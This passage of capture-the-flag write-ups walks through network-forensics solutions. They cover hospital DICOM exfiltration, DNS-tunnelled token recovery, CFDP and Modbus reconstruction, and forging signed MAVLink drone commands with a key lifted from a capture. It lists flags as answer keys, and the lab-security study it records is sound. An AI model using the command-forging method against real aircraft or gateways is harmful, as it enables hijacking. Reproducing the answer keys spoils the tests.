Reproduction: stdlib pcapng parse → group TCP payloads by 4-tuple → order by sequence number → split
at `\r\n\r\n` → `zlib.decompress(body, 47)` on the gzip login responses to recover session+key →
verify the HMAC canonicalization against the five captured requests → sign one `RETURN_TO_PAD` with
the server's `server_time`. Gotcha: the login body is gzip, the freshness window is server-enforced
(read `server_time`), and the body must be serialized compactly so the signed bytes match the sent
bytes.

### Operation Silent Ward

> Network · Hard · CSA Romania  
> Points: 821 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag:** `CSCTF{f75f58ab}`

**Tools used**

tshark, python3 (standard library).

**Challenge**

> A compromised medical-imaging device leaked patient data across a hospital network. The DICOM
> capture, device configuration, access ledger, SNMP alerts, and recovered exfiltration stream must
> be treated as corroborating evidence rather than independent answers. Reconstruct the intrusion and
> recover its marker.

The brief spells out the hash recipe, so all the work is pinning each field from corroborating
evidence across five files (`hospital_network.pcap`, `dicom_device.xml`, `patient_records.csv`,
`snmp_trap.log`, `exfil_stream.bin`):

```
sha256("<dicom_serial>:<snmp_iso_timestamp>:<leak_count>:<anomaly_count>:<manifest_seed>")[:8]
```

**Approach / walkthrough**

**1. Device configuration → serial and seed**

`dicom_device.xml` is the reference point: who the device is, where it may send data, its seed.

```sh
grep -nE "serial_number|DeviceManifestSeed|dicom_port|<port>|<protocol>" dicom_device.xml
```

```
<serial_number>MEDSCAN-XR400-2019</serial_number>
<dicom_port>104</dicom_port>
<ip_address>198.51.100.42</ip_address>  <port>8443</port>  <protocol>HTTPS</protocol>
<DeviceManifestSeed>8842</DeviceManifestSeed>
```

So `dicom_serial = MEDSCAN-XR400-2019` and `manifest_seed = 8842`. Note the topology: the imaging
device (10.20.30.45) speaks DICOM on port 104 to its internal archive (10.20.40.10), and the only
external host in the config is a "backup" at 198.51.100.42 configured for **HTTPS on port 8443**. Raw
DICOM (port 104) to that host is off-spec by definition.

**2. SNMP trap log → seed agreement and the incident start**

The log opens with four simultaneous `linkDown` traps (core router, both distribution switches,
patient-records server) at `2026-09-01T00:00:00Z`. The bulk of the file is that same four-device
pattern repeating at 00:00/06:00/12:00/18:00 daily through Sep 15:

```sh
grep -c "linkDown" snmp_trap.log   # 240
grep -c "ANOMALY"  snmp_trap.log   # 8
awk 'END{print NR}' snmp_trap.log  # 249  (240 linkDown + 8 ANOMALY + 1 boot report)
```

The eight `[ANOMALY]`-tagged lines are bulk-walks from the external host using the stolen community
string `hospital_mgmt_2026`, one per day Sep 1–8 — identical except for the date. **This is the
trap:** no artifact can single one of them out. The boot report confirms the seed and anchors the
timeline:

```
2026-09-01T00:00:01Z ... deviceBootReport Device: MEDSCAN-XR400 DeviceManifestSeed=8842
```

`DeviceManifestSeed=8842` agrees with the XML, and the device "boots" one second after the opening
linkDown burst.

**3. Leaked-record count**

```sh
tr -d '\r' < patient_records.csv | awk -F, 'NR>1{c[$8]++} END{for(k in c) print k, c[k]}'
```

```
Leaked 90
```

All 90 data rows carry status `Leaked`, so `leak_count = 90`. The file is CRLF, so the `tr -d '\r'`
matters — without it the last column reads `Leaked\r` and never matches.

**4. Packet capture → anomaly count**

```sh
tshark -r hospital_network.pcap -q -z conv,tcp
```

Three conversations: 10.20.30.45 → 10.20.40.10:104 (50 frames, internal, normal); **10.20.30.45 →
198.51.100.42:104 (20 frames, 168 kB)** — the imaging device pushing DICOM to the *external* host on
port 104, a host the config only knows as an HTTPS backup; and 10.20.40.10 → 198.51.100.42:8443 (HTTP
`POST /api/upload`). Frames 1–50 are routine C-ECHO-RQ handshakes; frames 51–70 are C-STORE-RQ data
pushes, every one to the external host:

```sh
tshark -r hospital_network.pcap -Y "dicom && ip.dst == 198.51.100.42 && tcp.dstport == 104" \
  -T fields -e frame.number | awk 'END{print NR}'
```

```
20
```

`anomaly_count = 20` — the number of C-STORE-RQ frames the device pushes to the external host on
DICOM port 104.

**5. Decode the exfil stream (corroboration)**

`exfil_stream.bin` is 87 bytes XORed with the device serial as a repeating key:

```python
serial = "MEDSCAN-XR400-2019"
blob = open("exfil_stream.bin", "rb").read()
plain = bytes(b ^ serial.encode()[i % len(serial)] for i, b in enumerate(blob))
# b'198.51.100.42\x00...\x20\xfbward_exfil_2026\x00...'
```

Out comes the exfil's packing slip: the backup IP `198.51.100.42` in ASCII, then `20 fb` = 8443
big-endian (the HTTPS port from the XML), then the marker `ward_exfil_2026`. This confirms the
external host receiving the C-STOREs really is the IT-configured backup, and the serial does double
duty as the XOR key.

**6. Pin the timestamp (the only genuine puzzle)**

The bait is the eight `[ANOMALY]` bulk-walks — but they are identical events stamped one per day
(all at 03:15Z), and the capture window (00:00:30Z → 01:30:55Z, all on Sep 1) doesn't overlap any of
them. The intended "anomalous event" must be the one that actually starts the incident. Chronology:

| UTC time | What happens |
| --- | --- |
| 2026-09-01T00:00:00Z | Four simultaneous linkDown traps open the log |
| 2026-09-01T00:00:01Z | Imaging device boots, self-reports `DeviceManifestSeed=8842` |
| 2026-09-01T00:00:30Z | Capture begins (routine C-ECHO-RQ) |
| 2026-09-01T00:25:05Z | First of 20 C-STORE-RQ to 198.51.100.42:104 |

The network collapses, the device boots one second later, the capture picks up thirty seconds after
that, and everything flows from that opening moment. So `snmp_iso_timestamp = 2026-09-01T00:00:00Z`.

**7. Assemble the flag**

| Field | Value | Anchored in |
| --- | --- | --- |
| dicom_serial | `MEDSCAN-XR400-2019` | XML (also the XOR key) |
| snmp_iso_timestamp | `2026-09-01T00:00:00Z` | opening linkDown burst |
| leak_count | `90` | all 90 ledger rows Leaked |
| anomaly_count | `20` | 20 C-STORE-RQ to 198.51.100.42:104 |
| manifest_seed | `8842` | XML, echoed by boot report |

```python
material = "MEDSCAN-XR400-2019:2026-09-01T00:00:00Z:90:20:8842"
print("CSCTF{" + hashlib.sha256(material.encode()).hexdigest()[:8] + "}")   # CSCTF{f75f58ab}
```

The flag is **`CSCTF{f75f58ab}`**.

**Why it works**

Each attachment pins exactly one field and each field is anchored twice: the serial is also the XOR
key; the seed is in the XML and the boot report; the backup host appears in the config, the capture,
and the decoded blob; the counts come straight out of the data (90 leaked rows, 20 C-STORE-RQ frames
to an external IP on the DICOM port). The only genuine puzzle is the timestamp, where the obvious
`[ANOMALY]` lines are a trap (daily, indistinguishable, outside the capture window) and the true
incident start is the opening linkDown burst.

**Validation / reproduction**

A script reads all five fields from the evidence, asserts the seed agrees between XML and trap log,
and computes the hash. Only the timestamp field was genuinely ambiguous. The saved workspace records
three rejected candidates — the first and last `[ANOMALY]` lines (both `03:15:00Z`, on 09-01 and
09-08) and the boot-report time (`00:00:01Z`) — before the recipe resolved to the log's opening
linkDown burst at `2026-09-01T00:00:00Z`; .dev landed that value for the credited solve.

Reproduction: SHA-256 of `MEDSCAN-XR400-2019:2026-09-01T00:00:00Z:90:20:8842`, keep the first eight
hex. Gotchas: strip `\r` before counting Leaked rows; count C-STORE-RQ frames to the external host on
port 104 (not the internal C-ECHO handshakes); and take the incident-start timestamp, not the
`[ANOMALY]` decoys.

### Radar Silence

> Network · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag:** `CSCTF{rdr37_rotation_b1097f6e977015cac0297ddc3335509f}`

**Tools used**

tshark, python3 (standard library).

**Challenge**

> RDR37 (`192.0.2.37`) carries the air-surveillance radar link of an Operation Dawn ally; OPS40
> (`192.0.2.40`) logs operations. Analysts marked RDR37 for a suspected bearer-token leak. This
> PCAPNG is an isolated-lab replay. Determine whether a bearer token left RDR37 and recover it for
> reissue. Submit `CSCTF{<source>_rotation_<token>}` using the lower-case station ID and a
> 32-character lower-case hex token.

A single pcapng, `radar-silence.pcapng`, holding 28 packets.

**Approach / walkthrough**

**1. What channel could carry a token?**

Protocol hierarchy first — it shows where data could have left the host:

```sh
tshark -r radar-silence.pcapng -qz io,phs
```

```
frame   frames:28
  eth   frames:28
    ip  frames:28
      udp frames:28
        dns frames:28
```

28 DNS packets, nothing else — no HTTP, no TCP. If a token left RDR37, it left inside DNS query
names (classic DNS exfiltration): the resolver logs the full query name even when the answer is
meaningless.

**2. List every query and who sent it**

```sh
tshark -r radar-silence.pcapng -Y 'dns.flags.response == 0' -T fields \
  -e frame.number -e ip.src -e dns.qry.type -e dns.qry.name
```

Four queries stand out (frames 5, 9, 15, 21): all from RDR37 `192.0.2.37`, all to the external-looking
zone `update.svc-telemetry.example`, each with a **13-character first label using only `a-z` and
`2-7`** (the base32 alphabet) followed by a two-digit sequence label `00`–`03`. They are sent **out of
order** (02, 00, 03, 01):

```
5	192.0.2.37	rtamrzg5sgiyz.02.update.svc-telemetry.example
9	192.0.2.37	miytaojxmy3gk.00.update.svc-telemetry.example
15	192.0.2.37	tgmztknjqhfta.03.update.svc-telemetry.example
21	192.0.2.37	ojxg4ydcnldmf.01.update.svc-telemetry.example
```

Traps: the two TXT answers (`v=DMARC1; p=none`, `ok`) carry nothing;
`telemetry.svc-telemetry.example` and OPS40's `status.svc-telemetry.example` query are cover traffic
in the same zone, not chunks. A strict regex extracts exactly the four chunk queries and drops the
decoys:

```sh
tshark -r radar-silence.pcapng \
  -Y 'dns.flags.response == 0 && dns.qry.name matches "^[a-z2-7]+\.[0-9]+\.update\.svc-telemetry\.example$"' \
  -T fields -e frame.number -e ip.src -e dns.qry.name
```

**3. Reorder, decode, recover**

Sort by the `NN` sequence label, concatenate the four 13-char labels (52 chars), upper-case, pad to a
multiple of 8, and base32-decode (RFC 4648). The core:

```python
rows.sort()                                   # by the NN sequence label
joined = "".join(chunk for *_, chunk in rows) # 52 chars
padded = joined.upper() + "=" * (-len(joined) % 8)
token = base64.b32decode(padded).decode()     # 32 lowercase hex chars
station = {"192.0.2.37": "rdr37", "192.0.2.40": "ops40"}[source]
print(f"CSCTF{{{station}_rotation_{token}}}")
```

```
seq 00  frame  9  miytaojxmy3gk
seq 01  frame 21  ojxg4ydcnldmf
seq 02  frame  5  rtamrzg5sgiyz
seq 03  frame 15  tgmztknjqhfta
base32 (52 chars): miytaojxmy3gkojxg4ydcnldmfrtamrzg5sgiyztgmztknjqhfta
token  (32 chars): b1097f6e977015cac0297ddc3335509f
CSCTF{rdr37_rotation_b1097f6e977015cac0297ddc3335509f}
```

All four chunks originate from `192.0.2.37`, so `<source>` is `rdr37`. The flag is
**`CSCTF{rdr37_rotation_b1097f6e977015cac0297ddc3335509f}`**.

**Why it works**

With no HTTP or TCP in the capture, DNS is the only channel the token could have used. The leaking
host split the 32-char hex token into base32, cut it into four 13-character labels, and sent each as
the leftmost label of an A query to an attacker-controlled zone. Base32 is the natural choice because
DNS labels are case-insensitive and base32's alphabet (`a-z`, `2-7`) survives that. Shuffled send
order plus same-zone decoy queries defeat a naive capture-order read; the explicit sequence label
restores the token.

**Validation / reproduction**

The decoded bytes are exactly 32 lowercase hex characters, matching the token shape the brief demands,
and every chunk originates from the same host. Concatenating in capture order (02, 00, 03, 01) instead
base32-decodes to binary garbage (`b'\x8c\xc0\xc8\xe4...'`), confirming the sequence-label ordering is
correct. Accepted on first submission.

Reproduction: filter the four `<chunk>.<NN>.update.svc-telemetry.example` A queries, sort by `NN`,
concatenate, upper-case, base32-decode. Gotcha: order by the sequence label, not capture order, and
map `192.0.2.37` → `rdr37`.

### Severed Link

> Network · Easy · Teodor Giurgica  
> Points: 120 · Flag submitted by: secretNinja

**The flag:** `CSCTF{1SjwLfR8QgSXGszVbKNOyUCO}`

**Tools used**

Custom MAVLink 2 framing/signing in Python (hashlib for the SHA-256 MAC); tshark for inspection.

**Challenge**

> A reconnaissance drone takes orders from its field station over a signed MAVLink 2 link.
> Mid-mission the operator rotated the signing key, then pushed the new key over that same link while
> it was being recorded. The uplink gateway is still online. Show that an outsider can take the
> operator's place and command the aircraft.

`severed-link.zip` holds `mission.pcap`, `mission.tlog` (the same signed MAVLink traffic as raw
frames), and `ops_notes.txt` (operator station sysid 255, drone sysid 1, per-frame signing on, key
rotated **in band over the same console link** "instead of the out-of-band provisioning channel it
should have used"). The live uplink gateway is a per-team instance (`<instance>`, TCP 5760). The notes
give away the bug class: a key-management failure, not a cryptographic weakness — MAVLink 2 signing
(truncated SHA-256 MAC over a 32-byte secret) is sound; the secret was simply sent over the link it
protects.

**Approach / walkthrough**

**1. Inventory the frames**

A MAVLink 2 frame starts with magic `0xFD`, then `len, incompat_flags, compat_flags, seq, sysid,
compid`, a 3-byte `msgid`, the payload, a 2-byte CRC, and — when `incompat_flags & 0x01` — a 13-byte
signature trailer (`link_id`(1) + `timestamp`(6) + `sig`(6)). Walking the tlog, the operator is sysid
255 / compid 190, and there is exactly one `SETUP_SIGNING` (msgid **256**) frame — the in-band key
push:

| sysid/compid | msgid | Message | Count |
| --- | --- | --- | --- |
| 1/1 | 0 | HEARTBEAT | 34 |
| 1/1 | 33 | GLOBAL_POSITION_INT | 34 |
| 1/1 | 24 | GPS_RAW_INT | 34 |
| 255/190 | 76 | COMMAND_LONG | 3 |
| 255/190 | 75 | COMMAND_INT | 1 |
| 255/190 | **256** | **SETUP_SIGNING** | 1 |

**2. Pull the key out of SETUP_SIGNING**

MAVLink serializes fields **sorted by type size**, not XML order. So on the wire `SETUP_SIGNING` is
`initial_timestamp` (uint64), `target_system` (uint8), `target_component` (uint8), then
`secret_key[32]` — the key starts at payload offset 10:

```
payload: f708000000000000 01 01 8f2b4e71a6c3d05f9217bc84e63a1d57f0482c6b9e13a7d5c84f26019bd3ea60
         initial_ts=2295  ts tc  secret_key
KEY = 8f2b4e71a6c3d05f9217bc84e63a1d57f0482c6b9e13a7d5c84f26019bd3ea60
```

**3. Confirm it is the *current* key**

The MAVLink 2 signature is `sig = SHA-256(KEY || frame_without_trailer || link_id || timestamp)[:6]`
(link_id 0 here). Every frame in the recording carries a signature (107 signed frames, 0 unsigned).
Recomputing the MAC for each one with the recovered key splits the recording cleanly: **exactly 50
frames verify and 57 do not.** The 50 that verify are the post-rotation frames; the 57 failures are the
56 pre-rotation frames plus the `SETUP_SIGNING` carrier frame itself, which is signed under the
departing old key (a key change authenticated under the key it replaces). By message type the verifying
set is HEARTBEAT ×16, GLOBAL_POSITION_INT ×16, GPS_RAW_INT ×16, COMMAND_LONG ×1 and the operator
COMMAND_INT (msg 75) ×1 — so the DO_REPOSITION the attack reissues sits in the post-rotation set the
recovered key validates. That identifies the recovered key as the one the gateway accepts now. Building fresh frames also
needs the MAVLink checksum CRC-16/MCRF4XX (X.25) over `header[1:] || payload || CRC_EXTRA`, with the
per-message CRC_EXTRA seeds (HEARTBEAT 0→50, COMMAND_INT 75→158, COMMAND_LONG 76→152,
SETUP_SIGNING 256→71); the CRC routine was verified against captured frames.

**4. What the live gateway wants**

Probing the per-team gateway (our own assigned instance) showed it accepts an operator command only
when it is sent from sysid 255, is a signed COMMAND_INT (msg 75) carrying MAV_CMD_DO_REPOSITION (192),
is stamped with a *current* signing timestamp (10 µs ticks since 2015-01-01 UTC, so a replayed captured
frame is refused because the timestamp must advance), and is preceded by a HEARTBEAT from the
"operator". The replay rejection is why the key was needed: re-sending captured bytes fails; only a
freshly signed frame passes.

**5. Reissue the operator's command, freshly signed**

The captured operator COMMAND_INT decodes to a DO_REPOSITION:

```
command=192 (DO_REPOSITION) frame=5 (GLOBAL_INT) target_system=1 target_component=1
param1=-1.0 param2=1.0 param3=0 param4=0  x=457920000 (lat 45.792) y=241510000 (lon 24.151) z=85.0
```

Against the team's own gateway, that same payload was rebuilt as a new MAVLink 2 frame (sysid 255 /
compid 190, `incompat_flags=0x01`, trailing-zero payload truncation, the msg-75 CRC, link_id 0, a
current timestamp, and a signature computed with the recovered key), sent as a signed HEARTBEAT first
and then the COMMAND_INT. The gateway returned:

```
OPERATOR AUTHENTICATED. Reposition accepted.
Audit receipt: CSCTF{1SjwLfR8QgSXGszVbKNOyUCO}
```

**Why it works**

MAVLink 2 message signing guarantees authenticity only while the 32-byte secret stays secret. Pushing
a rotated key in band with `SETUP_SIGNING`, over a link being recorded, hands the key to anyone holding
the capture. The gateway's timestamp window stops replay but not someone who holds the key and signs
fresh frames.

**Validation / reproduction**

The recovered key was verified against the capture before any live use: re-running the MAC over
`mission.tlog` gives a clean **50-of-107** verify split (57 fail), with every post-rotation frame
passing and the pre-rotation frames plus the `SETUP_SIGNING` carrier failing. One benign command was
sent to the assigned instance; the gateway's "Audit receipt" line returned the flag, accepted on the
first submission.

Reproduce: unzip; scan `mission.tlog` for `0xFD` frames; find msgid 256 and read the key at payload
offset 10; check `SHA-256(key || frame_without_trailer || link_id || ts)[:6]` against the
post-rotation frames; then, against the assigned instance only, send a signed HEARTBEAT (sysid
255/comp 190) followed by the captured DO_REPOSITION COMMAND_INT re-framed with a fresh timestamp and
signature. The frame builder (`x25()`, `build()`, `heartbeat()`) lives in
`workspace/9127-severed-link/solve.py`; note the saved `solve.py` is an earlier COMMAND_LONG probe, so
the final winning COMMAND_INT send and the gateway's full replies come from `notes.md`.

### Silent Orbit

> Network · Easy · Cosmin Gorea / HiveHack  
> Points: 120 · Flag submitted by: secretNinja

**The flag:**
`CSCTF{280069000107020800000000000000C0000000050000000600000013000000140000002300000024000000330000003400000044000000450000005300000054000000650000006600000077000000780000008A0000008B0000009A0000009B000000AB000000AC000000BB000000BC}`

**Tools used**

python3 (standard library); shasum to verify SHA256SUMS.

**Challenge**

The challenge-page text describes a Windows `telem_parser.exe` and a frame stream, but the shipped
`silent-orbit-cfdp.zip` does not match it: there is no binary, only `README.txt`,
`mission-profile.txt`, `civil_downlink.bin` and `SHA256SUMS` (all three hashes verify). `README.txt`
sets the real task:

> Reconstruct the exact CFDP NAK PDU the normal relay would emit. Submit the complete PDU as
> `CSCTF{UPPERCASE_HEX}`. The recording is raw concatenated Space Packets; it is not a PCAP.

So the page's `CSCTF{<APID>_<Timestamp>_<CRC16>}` format is overridden: the flag is the uppercase hex
of a single CFDP NAK PDU, built by running the relay's deterministic rules over the recording.

**Approach / walkthrough**

`mission-profile.txt` is the full specification. The work is to parse the stream, apply the
eligibility/state rules exactly, complement the received coverage, and serialize the NAK.

**1. Parse the outer CCSDS stream**

Each Space Packet is a 6-octet primary header followed by `(packet_length + 1)` user-data octets.
Reject any truncation; do not resynchronize. `civil_downlink.bin` parses exactly into 188 packets with
no leftover bytes.

**2. Keep only eligible target PDUs**

A packet contributes only if it is telemetry with PVN 000, **APID 0x321**, secondary-header flag 0 and
sequence flags 11, and its user-data field is exactly one complete CFDP PDU. Within those, the target
CFDP transaction is Version 001, toward receiver, acknowledged, no PDU CRC, small-file, with
one-octet entity/sequence encodings and the source/sequence/destination tuple **0x01 / 0x07 / 0x02**.
The capture plants decoys that must be rejected: a Metadata PDU on ineligible APID 0x012, File Data for
another transaction (tuple 03/09/02), and one duplicate segment. The eligibility check in code:

```python
# primary header: PVN 000, no sec-hdr, APID 0x321, seq flags 11
if (w>>13)!=0 or (w>>12)&1 or (w>>11)&1 or (w&0x7ff)!=0x321 or (s>>14)!=3: continue
...
if el!=1 or tl!=1: continue           # one-octet entity/sequence encodings
if ud[4:7]!=bytes([1,7,2]): continue   # tuple 0x01/0x07/0x02
```

**3. Run the relay state machine**

- **WAIT_METADATA → COLLECT.** Accept only the first valid target Metadata (small file, checksum type
  15 = NULL_CHECKSUM, closure flag 0, no option TLVs) to learn the file size and enter COLLECT. Here
  that is packet 2 with `size = 0xC0 = 192`.
- **COLLECT.** Each valid target File Data PDU contributes `[offset, offset + len)` only if its
  non-wrapping end is within the size; duplicates/overlaps merge.
- **EOF.** The first valid EOF (directive 0x04, No Error, null checksum, `file_size == Metadata size`)
  snapshots coverage. Here that is packet 187, `size 192`.

Packet sequence counts are capture metadata and are never used as file-byte coverage.

**4. Complement the coverage and serialize the NAK**

The received coverage leaves exactly **twelve single-byte gaps** over `[0, 192)` — the suppressed File
Data — at offsets 5, 19, 35, 51, 68, 83, 101, 119, 138, 154, 171, 187:

```
coverage [[0,5],[6,19],[20,35],[36,51],[52,68],[69,83],[84,101],[102,119],[120,138],[139,154],[155,171],[172,187],[188,192]]
missing  [(5,6),(19,20),(35,36),(51,52),(68,69),(83,84),(101,102),(119,120),(138,139),(154,155),(171,172),(187,188)]
```

The deferred NAK PDU is the CFDP header for the same tuple, directive `0x08`, scope `[0, file_size)`,
then each gap as an ascending, maximal, non-overlapping `[start, end)` pair:

```python
body = bytes([8]) + (0).to_bytes(4,'big') + eof.to_bytes(4,'big') \
     + b''.join(a.to_bytes(4,'big') + b.to_bytes(4,'big') for a,b in miss)
pdu  = bytes([0x28]) + len(body).to_bytes(2,'big') + bytes([0x00,1,7,2]) + body
print('CSCTF{' + pdu.hex().upper() + '}')
```

The whole PDU in uppercase hex is the flag: it begins `2800690001070208` (header + directive 8),
`00000000 000000C0` (scope 0..192), then the twelve `[start,end)` pairs
(`00000005 00000006`, `00000013 00000014`, …, `000000BB 000000BC`).

**Why it works**

The profile turns the recording into one deterministic record. The NAK a correct relay would send is
exactly the complement of what was actually received: twelve single-byte gaps the suppressed File Data
left uncovered. The output is unique only if the eligibility, state and serialization rules are
followed exactly — which PDUs count, and byte offsets rather than sequence counts. The planted decoys
(the ineligible-APID Metadata, the other-transaction File Data, the duplicate segment) are what the
rules are designed to reject.

**Validation / reproduction**

The parser consumes the stream with no truncation (188 packets parse exactly), the Metadata and EOF
file sizes agree (both 192), and the coverage gaps reproduce as the twelve single bytes above. Running
the saved `workspace/9065-silent-orbit/solve.py` against `civil_downlink.bin` re-emits the exact flag.
The serialized PDU was accepted on the first submission.

Reproduction: `python3 solve.py civil_downlink.bin`. Gotchas: reject the ineligible-APID Metadata and
the other-transaction (03/09/02) File Data; merge the duplicate segment; and complement over `[0,
file_size)` using byte offsets, not packet sequence counts.

### Water Hammer Reconciliation

> Network · Medium · Cosmin Gorea / HiveHack  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag:** `CSCTF{L3LBJQQRIXYIBUFDABBXKLH2EEHWDIUZAM2R3XQ}`

**Tools used**

unzip, tshark (for inspection), python3 (standard library).

**Challenge**

> Reconstruct the complete confirmed Modbus/TCP control history and submit the reconciliation
> identifier the evidence supports. `water-hammer-reconciliation.zip` holds `reserve-header.pcapng`,
> `station-profile.txt` and `capture-manifest.txt`. The profile defines the scoped conversation, the
> confirmation rule, the safety screen, the report grammar and the submission encoding. The capture
> holds ordinary reads, one exception and one unanswered write — a write acknowledgement on its own is
> not a confirmed control snapshot, so follow the profile's matched-readback rule. Flag format:
> `CSCTF{message}`.

`capture-manifest.txt` is only provenance; everything computed is defined in `station-profile.txt`.

**Approach / walkthrough**

**1. Read the station profile**

- **Scope.** Only the TCP conversation `192.0.2.10 → 192.0.2.20:502`, unit ID 17, read as fully
  reassembled byte streams. Each Modbus/TCP ADU is a 6-byte MBAP header (transaction ID, protocol
  ID = 0, Length) followed by `Length` bytes.
- **Registers.** Holding registers `0x1000`–`0x1003` are `p` (pump target), `g` (gate opening), `a`
  (ARMED) and `r` (ramp time, µs).
- **Confirmation rule.** A write is a *confirmed snapshot* only when a valid FC16 write to
  `0x1000`–`0x1003` is echoed (one normal response, same transaction ID), the **very next client
  ADU** is the FC3 readback `03 1000 0004`, and that readback returns exactly one normal response
  carrying the four register values. The snapshot values are those four registers; rows are ordered
  by the frame of the FC16 response, and the row's `tid` is the FC16 transaction ID, **not** the
  readback's (the profile warns about this explicitly).
- **Report.** `R` is the version line `water-hammer-reconciliation-v2`, the initial tuple, `n=64`, one
  `i=...;tid=...;p=...;g=...;a=...;r=...` line per snapshot, and a final `unsafe-mask=` line, joined
  with LF and no trailing LF. The identifier is RFC-4648 Base32 (no padding) of the first 24 bytes of
  `SHA-256(R)`.

The safety screen that produces the mask:

```
initial_tuple=p=80;g=500;a=0;r=60000
E_i=floor(P_i*G_i/1000)
V_i=floor(E_i*1000000/70686)
Q_i=998*1065*abs(V_i-V_(i-1))
T_US=floor(2*20000*1000000/1065000)=37558
UNSAFE_i=1 iff A_i=1 and R_i<T_US and Q_i>9000*100000
```

`V_(i-1)` is the **previous row's** velocity, so `V` carries row to row; only row 0 is compared with
`V_-1 = 565` (from the initial `p=80, g=500`). Row `i` sets bit `63-i`. The profile also ships a
public test vector (two synthetic rows with expected SHA-256 and Base32) to check the report/encoding
code before touching the capture.

**2. Look at the Modbus traffic**

```sh
tshark -r reserve-header.pcapng -q -z conv,tcp
```

One conversation, `192.0.2.10:36853 ↔ 192.0.2.20:502`, 536 frames. The client splits most requests
across two TCP segments, which is why the profile insists on reassembled streams. The first real
write is transaction `2000`: FC16 start `1000`, quantity 4, values `007e 0352 0001 257a` =
126, 850, 1, 9594; frame 17 echoes `10 1000 0004`; the readback `03 1000 0004` (transaction `8000`)
returns the same four values. That is one confirmed snapshot. Listing every ADU shows the full shape:

```
    4  client  tid=E010  fc=3   len= 6
    6  server  tid=E010  fc=3   len=11  regs=80,500,0,60000
   11  client  tid=E100  fc=16  len= 9  regs=120
   13  server  tid=E100  fc=16  len= 3  exception=4
   15  client  tid=2000  fc=16  len=15  regs=126,850,1,9594
   17  server  tid=2000  fc=16  len= 6
   19  client  tid=8000  fc=3   len= 6
   21  server  tid=8000  fc=3   len=11  regs=126,850,1,9594
   ...
  531  client  tid=E101  fc=16  len= 9  regs=96        (no response)
```

The 267 ADUs per side line up with the brief: harmless FC3 reads (`E010`/`E011` at the start return
the initial tuple; `E012`/`E013` at the end repeat the final snapshot); one FC16 exception (`E100`,
code 4); one unanswered write (`E101`); and in between, 64 rounds of FC16 write → echo → FC3 readback →
readback response. That is 4×2 + 2 + 1 + 64×4 = 267.

**3. Rebuild the history and derive the identifier**

tshark is for looking; the profile's rules are about exact bytes, so the reconciliation is a small
standard-library Python script. It walks the pcapng's Enhanced Packet Blocks, reassembles both TCP
directions by sequence number (remembering which frame completed each byte), splits into strict MBAP
ADUs, and applies the confirmation rule. The confirmation core:

```python
echo = b"\x10" + struct.pack(">HH", start, qty)
# one normal echo, same tid; the very next client ADU must be the FC3 readback
if resp["pdu"] != echo: drop()
nxt = client[k + 1]
if not (nxt["pdu"] == READBACK and nxt["frame"] > resp["frame"]): drop()
# readback answer: MBAP Length 11, PDU 03 08 + 8 data bytes -> the snapshot
p, g, a, r = struct.unpack(">4H", back["pdu"][2:])
rows.append((resp["frame"], resp["tid"], p, g, a, r))   # ordered by FC16 response frame
```

The unsafe mask uses the carried velocity:

```python
prev = velocity(80, 500)                       # V_-1 = 565
for i, (_tid, p, g, a, r) in enumerate(rows):
    v = velocity(p, g)
    q = 998 * 1065 * abs(v - prev)             # against the PREVIOUS row's velocity
    if a == 1 and r < 37558 and q > 9000 * 100000:
        mask |= 1 << (63 - i)
    prev = v
```

Running it reproduces the profile's public test vector first (so the layout and encoding are right),
drops the exception and the unanswered write, and leaves exactly 64 snapshots:

```
public test vector: IAO7QJHG2XIJQ5I2PR7OA6WYEEPRHF7OO6M6QOA OK
FC16 tid E100 (frame 11): dropped, response 9004 is not a normal echo
FC16 tid E101 (frame 531): dropped, 0 responses
confirmed snapshots: 64
...
unsafe-mask=D3FC7C00A3060000
sha256: 5ed614c21145f080d0a30043752cfa210f61a29903351dde2485f0da0564b8f3
CSCTF{L3LBJQQRIXYIBUFDABBXKLH2EEHWDIUZAM2R3XQ}
```

The mask `D3FC7C00A3060000` has 22 of 64 bits set. To see the carried velocity at work (998×1065 =
1062870; the limit is 900000000):

| i | p, g | E | V | ΔV from previous row | Q | unsafe |
| --- | --- | --- | --- | --- | --- | --- |
| 0 | 126, 850 | 107 | 1513 | 948 (vs 565) | 1007600760 | 1 |
| 1 | 147, 239 | 35 | 495 | 1018 | 1082001660 | 1 |
| 2 | 104, 837 | 87 | 1230 | 735 | 781209450 | 0 |
| 3 | 156, 143 | 22 | 311 | 919 | 976777530 | 1 |

Bits `1101` give the leading `D`. If every row were compared against `V_-1 = 565` instead, rows 1 and
3 would flip to 0 (ΔV of 70 and 254) and the hash would change — exactly the bug the solver first hit.
The flag is **`CSCTF{L3LBJQQRIXYIBUFDABBXKLH2EEHWDIUZAM2R3XQ}`**.

**Why it works**

The profile reduces the capture to one deterministic text, so the only real decision is which writes
count. An FC16 echo only proves the request was accepted; pairing it with the immediately following
FC3 readback proves the state actually held, which is why exactly 64 snapshots survive. The screen is
a bounded Joukowsky water-hammer check — `Q` is the surge ρ·a·ΔV with density 998 and wave speed 1065,
and `T_US` is the pipe's 2L/a reflection time — so a row is unsafe when an armed, fast ramp changes
the flow velocity enough to push the surge past the limit. The velocity carried from the prior row is
what makes the surge calculation, and thus the mask, correct.

**Validation / reproduction**

The profile ships a public test vector (two synthetic rows with expected SHA-256 and Base32); running
the report/encoding code against it matched before touching the capture. Four submissions in total:
the team's automated intake sent two wrong values at release, both copied from the brief's placeholder
text, before any analysis. The solver's first real submission was also wrong — a bug kept every row
compared against `V_-1` instead of the previous row's velocity, so the mask was wrong. With the
per-row carry restored, the mask came out as `D3FC7C00A3060000` (22 of 64 rows), and that flag was
accepted. The 64-snapshot count and all per-row evidence checks (ARMED=1, ramp under threshold,
changed velocity) hold.

Reproduction: run `reconcile.py` against `reserve-header.pcapng` after confirming the public test
vector. Gotcha: carry `V` from the previous confirmed row (not a constant seed), confirm each write
with its immediately-following FC3 readback, and label rows by the FC16 transaction id rather than the
readback's.


## OSINT

### Cloudflare Deanon: Find the Back Office

> OSINT · Medium · Created by [Covert Security](https://covsec.ee)  
> Points: 327 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{t2YGg14buPVPPnd9uvazWcdvT9UMCh3J}`

**Challenge**

Task 3 of the Cloudflare-deanon lab: find the operator's backend panel on the Task 2 origin (`185.146.86.118`) and read the hot-wallet admin key off it. The answer boundary: use the unique origin from Task 2, the admin key must be shown verbatim by the backend panel, and no path enumeration, wordlists, or generated candidate keys are allowed. No files ship.

